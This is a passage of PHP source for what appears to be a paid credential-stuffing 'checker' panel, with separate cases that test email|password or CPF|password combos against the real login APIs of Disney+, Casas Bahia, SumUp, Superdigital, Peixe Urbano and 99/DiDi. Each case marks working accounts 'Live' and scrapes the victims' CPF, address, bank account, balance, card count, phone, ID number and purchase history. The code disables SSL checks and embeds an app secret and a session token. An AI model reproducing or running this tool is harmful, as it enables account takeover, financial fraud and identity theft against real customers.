XJuOmJhbXRlY2g6cHJvZmlsZSIsImxhbmd1YWdlX3ByZWZlcmVuY2VzIjp7ImFwcF9sYW5ndWFnZSI6ImVuLUdCIiwicGxheWJhY2tfbGFuZ3VhZ2UiOiJlbi1HQiIsInN1YnRpdGxlX2xhbmd1YWdlIjoiZW4tR0IifX1dLCJpcF9hZGRyZXNzIjoiMTg3LjQ0LjE1MS4xNyIsInR5cGUiOiJBTk9OWU1PVVMiLCJ2ZXJzaW9uIjoiVjIuMC4wIiwiYmxhY2tvdXRzIjp7ImVudGl0bGVtZW50cyI6W10sImRhdGEiOnt9LCJydWxlcyI6eyJ2aW9sYXRlZCI6W119fSwicGFydG5lciI6eyJuYW1lIjoiZGlzbmV5In0sImxvY2F0aW9uIjp7ImNvdW50cnlfY29kZSI6IkJSIiwiY2l0eV9uYW1lIjoiY2FuZGVpYXMiLCJjb25uZWN0aW9uX3R5cGUiOiJkc2wiLCJzdGF0ZV9uYW1lIjoiYmFoaWEiLCJkbWEiOjAsInJlZ2lvbl9uYW1lIjoibm9ydGhlYXN0IiwidHlwZSI6IlpJUF9DT0RFIiwiYXNuIjoyODE4NiwiemlwX2NvZGUiOiI0MzgyMC0wMTAifSwiZ2VuZXJhdGVkX29uIjoiMjAyMC0xMS0yN1QxNDozMzo0Mi42NjArMDAwMCIsImlkIjoiOGM1YTFjNDAtMzBiZC0xMWViLTk1NjQtMDI0MmFjMTEwMDA3IiwibWVkaWFfcGVybWlzc2lvbnMiOnsiZW50aXRsZW1lbnRzIjpbXSwiZGF0YSI6e30sInJ1bGVzIjp7InBhc3NlZCI6W119fSwiZGV2aWNlIjp7ImFwcF9ydW50aW1lIjoiYW5kcm9pZCIsInByb2ZpbGUiOiJwaG9uZSIsImlkIjoiNmE4ZTU5YjMtM2RlYy00MDBiLWJlYzItNzg0YTJkYmE1YzZkIiwidHlwZSI6InVybjpkc3M6ZGV2aWNlOmludGVybmFsIiwiZmFtaWx5IjoiYW5kcm9pZCIsInBsYXRmb3JtIjoiYW5kcm9pZCJ9LCJwcmVmZXJyZWRfbWF0dXJpdHlfcmF0aW5nIjp7InJhdGluZ19zeXN0ZW0iOiJESkNUUSIsInByb2ZpbGVfaGFzX21hdHVyaXR5X3JhdGluZyI6ZmFsc2UsImltcGxpZWRfbWF0dXJpdHlfcmF0aW5nIjo5OTk5fSwic3VwcG9ydGVkIjp0cnVlfSwiZW52IjoicHJvZCIsImV4cCI6MTYwNjUwMjAyMiwiaWF0IjoxNjA2NDg3NjIyLCJqdGkiOiJmOGI3Nzg5Yi04ZGI1LTQ0ZDMtOGVjYy1kODFkYWQwM2RjOWUifQ.XzqURVvp42c_3Dub79WeICaraD1I9HlmyLtGvw935rMw_zJn2IVW3OVvGHBFixZtnberBH28qqcoBDBe7yLADQ',
'user-agent: BAMSDK/v4.18.0 (disney-svod-3d9324fc 1.11.2.0; v2.0/v4.18.0; android; phone) xiaomi Redmi Note 6 Pro (PKQ1.180904.001; Linux; 9; API 28)',
'content-type: application/json; charset=utf-8'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","password":"'.$senha.'"}');
$ku = curl_exec($ch);




if(stripos($ku, '"forbidden"') !== false) {
	echo "Aprovada -> $email|$senha | #MadibuX <br>";
debitar_creditos("1.00");
contar_login();
}
else {
	echo "Reprovada -> $email|$senha | <span class='badge badge-danger'>$msg</span> | MadiabuX";
}





break;
case 'bahia':

error_reporting(0);
set_time_limit(0);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];
$separa = explode("|", $lista);
$email = trim($separa[0]);
$senha = trim($separa[1]);
$emailesenha = ''.$email.''.$senha.'';

if($emailesenha == '') {
echo "<font style='color: blueviolet'>Login lixo by</font> <font style='color: gold'>MadibuX</font> <span class='label label-roxo'><font style='color: #3D2B1F'>✗</font></span> <span class='label label-roxo'><font style='color: white'>null</font> <font style='color: #3D2B1F'>✗</font></span> <font style='color: white'>|</font> <span class='label label-roxo'><font style='color: white'>null</font> <font style='color: #3D2B1F'>✗</font></span> <font style='color: white'>|</font> <font style='color: blueviolet'>Retorno:</font> <span class='label label-vermelho'><font style='color: white'>Email e senha obrigatórios!</font> <font style='color: #3D2B1F'>✗</font></span>";
return;
}else if($email == '') {
echo "<font style='color: blueviolet'>Login lixo by</font> <font style='color: gold'>MadibuX</font> <span class='label label-roxo'><font style='color: #3D2B1F'>✗</font></span> <span class='label label-roxo'><font style='color: white'>null</font> <font style='color: #3D2B1F'>✗</font></span> <font style='color: white'>|</font> <span class='label label-vermelho'><font style='color: white'>".$senha."</font></span> <font style='color: white'>|</font> <font style='color: blueviolet'>Retorno:</font> <span class='label label-vermelho'><font style='color: white'>Email  obrigatório!</font> <font style='color: #3D2B1F'>✗</font></span>";
return;
}else if($senha == '') {
echo "<font style='color: blueviolet'>Login lixo by</font> <font style='color: gold'>MadibuX</font> <span class='label label-roxo'><font style='color: #3D2B1F'>✗</font></span> <span class='label label-vermelho'><font style='color: white'>".$email."</font></span> <font style='color: white'>|</font> <span class='label label-roxo'><font style='color: white'>null</font> <font style='color: #3D2B1F'>✗</font></span> <font style='color: white'>|</font> <font style='color: blueviolet'>Retorno:</font> <span class='label label-vermelho'><font style='color: white'>Senha obrigatório!</font> <font style='color: #3D2B1F'>✗</font></span>";
return;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://carrinho.casasbahia.com.br/Api/checkout/Cliente.svc/Cliente/Login");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	    'Origin: https://carrinho.casasbahia.com.br',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
		'Referer: https://carrinho.casasbahia.com.br/Checkout?ReturnUrl=https://www.casasbahia.com.br',
		'content-type: application/json',
        'Connection: Keep-Alive'
        ));
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/casas.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/casas.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 0);       
curl_setopt($ch, CURLOPT_REFERER, '');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clienteLogin":{"Token":"'.$token.'","Operador":"","IdUnidadeNegocio":8,"PalavraCaptcha":"","Senha":"'.$senha.'","cadastro":"on","Email":"'.$email.'"},"mesclarCarrinho":true,"Token":"'.$token.'","IdUnidadeNegocio":8,"Operador":""}');
$a = curl_exec($ch);
$token = getStr($a, 'var token = "','"');

if(strpos($a, '"NomeCompleto":null,')){
$nome = "Não registrado ✗";
$cornome = "vermelho";
}else if(strpos($a, '"NomeCompleto":"",')) {
$nome = "Não registrado ✗";
$cornome = "vermelho";
}else{
$nome = getStr($a, '"NomeCompleto":"','"');
$cornome = "roxo";
}

if(strpos($a, '"Estado":null,')){
$estado = "Não registrado ✗";
$corestado = "vermelho";
}else if(strpos($a, '"Estado":"",')) {
$estado = "Não registrado ✗";
$corestado = "vermelho";
}else if(strpos($a, '"UltimoEnderecoCadastrado":null')) {
$estado = "Não registrado ✗";
$corestado = "vermelho";
}else{
$estado = getStr($a, '"Estado":"','"');
$corestado = "laranja";
}

if(strpos($a, '"Municipio":null,')){
$mun = "Não registrado ✗";
$cormun = "vermelho";
}else if(strpos($a, '"Municipio":"",')) {
$mun = "Não registrado ✗";
$cormun = "vermelho";
}else if(strpos($a, '"UltimoEnderecoCadastrado":null')) {
$mun = "Não registrado ✗";
$cormun = "vermelho";
}else{
$mun = getStr($a, '"Municipio":"','"');
$cormun = "laranja";
}

if(strpos($a, '"Cpf":null,')){
$cpf = "Não registrado ✗";
$corcpf = "vermelho";
}else if(strpos($a, '"Cpf":"",')) {
$cpf = "Não registrado ✗";
$corcpf = "vermelho";
}else{
$cpf = getStr($a, '"Cpf":"','"');
$corcpf = "roxo";
}

curl_setopt($ch, CURLOPT_URL, "https://carrinho.casasbahia.com.br/Site/MeusPedidos.aspx");
$b = curl_exec($ch);

if(strpos($b, 'Detalhes do Pedido')){
$compras = "<span class='label label-verde'><font style='color: white'>Sim ✓</font></span>";
}else{
$compras = "<span class='label label-vermelho'><font style='color: white'>Não ✗</font></span>";
}

if(strpos($a, '"Erro":false,"')){
echo "<font style='color: lime'>Live by</font> <font style='color: gold'>MadibuX</font> <span class='label label-verde'><font style='color: #3D2B1F'>✓</font></span> <span class='label label-verde'><font style='color: white'>".$email."</font></span> <font style='color: white'>|</font> <span class='label label-verde'><font style='color: white'>".$senha."</font></span> <font style='color: white'>|</font> <font style='color: lime'>NOME:</font> <span class='label label-".$cornome."'><font style='color: white'>".$nome."</font></span> <font style='color: white'>|</font> <font style='color: lime'>CPF:</font> <span class='label label-".$corcpf."'><font style='color: white'>".$cpf."</font></span> <font style='color: white'>|</font> <font style='color: lime'>ESTADO:</font> <span class='label label-".$corestado."'><font style='color: white'>".$estado."</font></span> <font style='color: white'>|</font> <font style='color: lime'>MUNICIPIO:</font> <span class='label label-".$cormun."'><font style='color: white'>".$mun."</font></span> <font style='color: white'>|</font> <font style='color: lime'>COMPRAS:</font> ".$compras." <font style='color: white'>|</font> <font style='color: lime'>Retorno:</font> <span class='label label-verde'><font style='color: white'>Sucesso!</font> <font style='color: #3D2B1F'>✓</font></span>";
debitar_creditos("1.00");
contar_login();
}else{
echo "<font style='color: red'>Die By</font> <font style='color: gold'>MadibuX</font> <span class='label label-vermelho'><font style='color: #3D2B1F'>✗</font></span> <span class='label label-vermelho'><font style='color: white'>".$email."</font></span> <font style='color: white'>|</font> <span class='label label-vermelho'><font style='color: white'>".$senha."</font></span> <font style='color: white'>|</font> <font style='color: red'>Retorno:</font> <span class='label label-vermelho'><font style='color: white'>Email ou senha invalidos</font> <font style='color: #3D2B1F'>✗</font></span>";
}
break;
case 'sumup':

error_reporting(0);


function multiexplode($delimiters, $string) {
	$partida = str_replace($delimiters, $delimiters[0], $string);
	$executar = explode($delimiters[0], $partida);
	return $executar;
}
$lista = $_REQUEST['lista'];
$email = multiexplode(array(";", ":", "|", ">"), $lista)[0];
$senha = multiexplode(array(";", ":", "|", ">"), $lista)[1];


function puxar($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
} 

if (file_exists("cookie.txt")) {
        unlink("cookie.txt"); 
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://triangle-ng.sumup.com/api/0.1/auth");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_USERAGENT, "sumup/2.9.8 android/9");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: triangle-ng.sumup.com',
'accept: application/json',
'sumup/2.9.8 android/9',
'accept-language: pt_BR',
'x-transaction-id: b627e8ec-e7d1-4ef9-8465-09401e0acb3c',
'content-type: application/json; charset=utf-8'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"id":"68cea670#b61eb078-3a25-4737-933e-dbc4043d1bd0","method":"login","jsonrpc":"2.0","params":{"location":{"lat":0,"lon":0,"horizontal_accuracy":0,"time_stamp":"1970-01-01T00:00:00+0000"},"language":"pt_BR","locale":"pt_BR","device":{"name":"tulip","system_name":"Android","model":"Redmi Note 6 Pro","system_version":"9","uuid":"68cea670-7282-335f-ace0-441ad42f2948"},"app":{"version":"203141923","version_name":"2.9.8","id":"com.kaching.merchant"},"username":"'.$email.'","password":"'.$senha.'","hashed":false}}');
$ku = curl_exec($ch);

$nome = puxar($ku, 'business_name":"','"');
$end = puxar($ku, 'address_line_1":"', '"');
$city = puxar($ku, 'city":"','"');
$pais = puxar($ku, 'en_name":"', '"');
$postal = puxar($ku, 'post_code":"', '"');
$Pagamento = puxar ($ku,  'mobile_payment":"', '"');
$info = puxar ($ku,  'reader_payment":"', '"');
$info1 = puxar ($ku,  'cash_payment":"', '"');
$info2 = puxar ($ku,  'barcode_scanner":"', '"');
$info3 = puxar ($ku,  'referral":"', '"');
$info4 = puxar ($ku,  'invoicing":"', '"');


if (strpos($ku, 'accesstoken') !== false) {
 echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha  | [Nome: $nome] <font color='red'></font>[Cidade: $city ] | [Pais: $pais] | [Endereço: $end] | [Code Postal: $postal] |  [Pagamento: $Pagamento] | [ReaderPagamento: $info] | [CashPagamento : $info1] | [faturação: $info4   ] | [Referência: $info3 ] | [ Codigo de barra : $info2] | #MadibuX <br>";
debitar_creditos("2.00");
contar_login();
}else{
   
       echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha | - #STRIKER";
       
       
       
 }


break;
case 'digital':
error_reporting(0);
$loadtime = time();

function Request($options) {
	
	



	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $options["url"]);
	curl_setopt($ch, CURLOPT_HEADER, true);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_ENCODING, $options["encoding"]);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $options["headers"]);
	curl_setopt($ch, CURLOPT_POST, $options["post"]);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $options["method"]);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $options["body"]);
	if (isset($options["cookie"])) {
		curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__)."/".$options["cookie"]);
		curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__)."/".$options["cookie"]);
		curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__)."/".$options["cookie"]);
		curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__)."/".$options["cookie"]);
	 }
	return curl_exec($ch);
 }
 
function PuxaDados($string, $start, $end, $i) {
	$str = explode($start, $string);
	$str = explode($end, $str[$i]);
	return $str[0];
 }

function multiexplode($delimiters,$string) {
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
 }
 
 function LimparCookies() {
	if (file_exists("cookie.txt")) {
		unlink("cookie.txt");
	}
}


 
$lista = $_GET['lista'];
$separar = multiexplode(array(",","»",";","|",":"), $lista);
$cpf = trim($separar[0]);
$senha = trim($separar[1]);


$nbr_cpf = $cpf;
$parte_um     = substr($nbr_cpf, 0, 3);
$parte_dois   = substr($nbr_cpf, 3, 3);
$parte_tres   = substr($nbr_cpf, 6, 3);
$parte_quatro = substr($nbr_cpf, 9, 2);

$monta_cpf = "$parte_um.$parte_dois.$parte_tres-$parte_quatro";

$senhaa = ''.md5($senha).'';

$data1 = Request([
	"url" => "https://api.superdigital.com.br:444/api/autenticacao/v3/",
	"encoding" => "gzip",
	"headers" => [
		'Accept: application/json',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Authorization: Bearer '.$auth.'',
'Connection: keep-alive',
'Content-Type: application/json',
'Host: api.superdigital.com.br:444',
'Origin: https://web.superdigital.com.br',
'Referer: https://web.superdigital.com.br/',
'SD-Id: 958d584ce5634dadb74da6a0e81acf18',
'SD-Language: pt_BR',
'SD-Platform: NovoSite.Mobile',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'],
	"post" => true,
	"method" => "POST",
	"body" => '{"cpf":"'.$monta_cpf.'","senha":"'.$senhaa.'"}',
]); 

//var_dump($data1);  ///cabecalho

if (strpos($data1, '"success":true') !== false) {

$nome = PuxaDados($data1, '"Nome":"','"', 1);
$auth = PuxaDados($data1, 'Authorization: Bearer ',' ', 1);
$banco = PuxaDados($data1, '"Banco":"','"', 1);
$agencia = PuxaDados($data1, '"Agencia":"','"', 1);
$conta = PuxaDados($data1, '"Conta":"','"', 1);
$DataNascimento = PuxaDados($data1, '"DataNascimento":"','T', 1);

if(strpos($data1, '"PossuiTokenApp":false')){

	$token = "Não";
}else{
	$token = "Sim";
}

$data2 = Request([
	"url" => "https://api.superdigital.com.br:444/api/contacorrente/saldos",
	"encoding" => "gzip",
	"headers" => [
'Accept: application/json',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Authorization: Bearer '.$auth.'',
'Connection: keep-alive',
'Content-Type: application/json',
'Host: api.superdigital.com.br:444',
'Origin: https://web.superdigital.com.br',
'Referer: https://web.superdigital.com.br/',
'SD-Id: 958d584ce5634dadb74da6a0e81acf18',
'SD-Language: pt_BR',
'SD-Platform: NovoSite.Mobile',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'],
	"post" => true,
	"method" => "GET",
]); 
//var_dump($data2);

if(strpos($data2, '"TipoConta":"P"')){

	$typee = "Pessoal";
}else{
	$typee = "Juridica";
}
$saldo = PuxaDados($data2, '"Valor":',',"', 1);
$siins = PuxaDados($data2, '"Simbolo":"','"', 1);


$data3 = Request([
	"url" => "https://api.superdigital.com.br:444/api/cartao/v2/100/obterCartoes/1",
	"encoding" => "gzip",
	"headers" => [
'Accept: application/json',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Authorization: Bearer '.$auth.'',
'Connection: keep-alive',
'Content-Type: application/json',
'Host: api.superdigital.com.br:444',
'Origin: https://web.superdigital.com.br',
'Referer: https://web.superdigital.com.br/',
'SD-Id: 958d584ce5634dadb74da6a0e81acf18',
'SD-Language: pt_BR',
'SD-Platform: NovoSite.Mobile',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'],
	"post" => true,
	"method" => "GET",
]); 
//echo $data3;

$ccs = substr_count($data3, '"NumeroCartaoMascarado":"');


$data4 = Request([
	"url" => "https://api.superdigital.com.br:444/api/cadastro/perfil",
	"encoding" => "gzip",
	"headers" => [
		'Accept: application/json',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Authorization: Bearer '.$auth.'',
'Connection: keep-alive',
'Content-Type: application/json',
'Host: api.superdigital.com.br:444',
'Origin: https://web.superdigital.com.br',
'Referer: https://web.superdigital.com.br/',
'SD-Id: 958d584ce5634dadb74da6a0e81acf18',
'SD-Language: pt_BR',
'SD-Platform: NovoSite.Mobile',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36'],
	"post" => true,
	"method" => "GET",
]); 

//var_dump($data4);  ///cabecalho


$Celular = PuxaDados($data4, '"Celular":',',"', 1);
$DocumentoIdentidade = PuxaDados($data4, '"DocumentoIdentidade":',',"', 1);
$Email = PuxaDados($data4, '"Email":',',"', 1);




  echo "<span class='badge badge-success'> ✔️Aprovada </span>&nbsp <span class='badge badge-info'>[ $cpf|$senha ] </span>&nbsp <span class='badge badge-info'> [Nome: $nome] </span>&nbsp <span class='badge badge-info'> [Tipo: $typee] </span>&nbsp <span class='badge badge-info'> [Email: $Email] </span>&nbsp <span class='badge badge-info'> [Banco: $banco] </span>&nbsp <span class='badge badge-info'> [Agencia: $agencia] </span>&nbsp <span class='badge badge-info'> [Conta: $conta] </span>&nbsp <span class='badge badge-info'> [Nascimento: $DataNascimento] </span>&nbsp <span class='badge badge-info'> [PossuiTokenApp: $token]  </span>&nbsp <span class='badge badge-info'> [Saldo: $siins$saldo] </span>&nbsp <span class='badge badge-info'> [Cards: $ccs] </span>&nbsp <span class='badge badge-info'> [Celular: $Celular] </span>&nbsp <span class='badge badge-info'> [RG: $DocumentoIdentidade] | dnl e terror é meu priu| </span>";
debitar_creditos("1.00");
contar_login();
}else {
	
	$authh1 = PuxaDados($data1, '"Mensagens":["','"]', 1);

  echo "<span class='badge badge-danger'> [ #Reprovada ] </span>&nbsp <span class='badge badge-info'> $cpf|$senha </span>";




}


break;
  case 'peixin':


extract($_GET);
error_reporting(0);

$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

    function soNumero($str) {
        return preg_replace("/[^0-9]/", "", $str);
    }


function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


function getString($string, $start, $end, $value)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}



if (file_exists(getcwd() . '/cookie.txt')) {
    unlink(getcwd() . '/cookie.txt');
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET') {
    extract($_GET);
}

function getStr2($string,$start,$end) {
  $str = explode($start,$string);
  $str = explode($end,$str[1]);
  return $str[0];
}


function Curl($url = false, $post = false, $header = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if ($header) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        }
        $exec = curl_exec($ch);
        return $exec;
    }
//*//*#Curl//*////*//

$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://api.peixeurbano.com.br/v2/Authentication/Login?appsecret=QasVmHaL55PPbMvPiDJe&domain=PU");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/2.7.5");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Host: api.peixeurbano.com.br',
    'Connection: Keep-Alive'));
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'appSecret=QasVmHaL55PPbMvPiDJe&username='.$email.'&password='.$senha.'');
  $resposta = curl_exec($ch);
  $nome = getStr($resposta, '"Name":"','",');
  $token = getStr($resposta, '"AccessToken":"','",');
  $local = getStr($resposta, '"UrlFormattedName":"','"}');
  $AmountSaved = getStr($resposta, '"AmountSaved":','"}');
  $creditBalance = getStr($resposta, '"CreditBalance":',',"');




  if (strpos($resposta, '"Success')) {



          if (strpos($resposta, '"CreditBalance":0,"')) {
    $cc = "<span class='badge badge-success'>".$creditBalance."</span>";
          }elseif (strpos($resposta, '"CreditBalance":0.0000,"')) {
            $cc = "<span class='badge badge-success'>".$creditBalance."</span>";
          }else{
    $cc = "<span class='badge badge-success'>".$creditBalance."</span>";
  }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.peixeurbano.com.br/v2/PurchaseHistory/SimpleList?appSecret=QasVmHaL55PPbMvPiDJe&accessToken=".$token."&f=&order=1&nocache=1&purchaseID=0&domain=PU");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/2.7.5");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
      'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
      'Host: api.peixeurbano.com.br',
      'Connection: Keep-Alive'));
    $resposta2 = curl_exec($ch);


    if (strpos($resposta2, 'CouponStatus":"Unmarked",')) {
      $cupomDisp = "<span class='badge badge-success'>Ha cupons disponiveis</span>";
    }else{
      $cupomDisp = "<span class='badge badge-success'>Sem Cupom Disponivel</span>";
    }


    $dados2 = json_decode($resposta2, true);
    $cupomStart = $dados2['Result'];



echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha <span class='badge badge-info'> $cc </span>&nbsp <span class='badge badge-info'> $cupomDisp </span> - #striker-";
debitar_creditos("0.10");
contar_login();
}else{
          echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha - #STRIKER";



}


  break;
  case '99pop':

extract($_GET);
error_reporting(0);

$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

    function soNumero($str) {
        return preg_replace("/[^0-9]/", "", $str);
    }


function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


function getString($string, $start, $end, $value)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}



if (file_exists(getcwd() . '/cookie.txt')) {
    unlink(getcwd() . '/cookie.txt');
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET') {
    extract($_GET);
}


function Curl($url = false, $post = false, $header = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if ($header) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        }
        $exec = curl_exec($ch);
        return $exec;
    }
//*//*#Curl//*////*//

$step_1 = Curl("https://epassport.didiglobal.com/passport/login/v5/signInByPassword?product_id=30008&trip_country=BR&trip_cityid=55000281&utc_offset=-240&origin_id=5&biz_type=1&terminal_id=5&platform_type=2&trip_type=BR&location_country=BR&location_cityid=55000281", 